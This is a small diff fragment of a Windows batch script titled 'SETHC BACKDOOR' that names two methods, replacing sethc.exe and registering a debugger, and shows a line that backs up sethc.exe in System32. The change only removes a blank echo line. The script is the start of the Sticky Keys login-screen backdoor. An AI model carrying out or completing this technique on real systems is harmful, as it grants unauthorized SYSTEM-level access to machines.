@@ -3,7 +3,6 @@
 ECHO ===========================================================================
 ECHO SETHC BACKDOOR
 ECHO Two methods: Replacement of sethc.exe / Debugger registration
-ECHO.
 ECHO Backing up old sethc.exe
 ping -n 5 127.0.0.1 > NUL
 COPY %SYSTEMROOT%\System32\sethc.exe %SYSTEMROOT%\System32\sethc.exe.bck
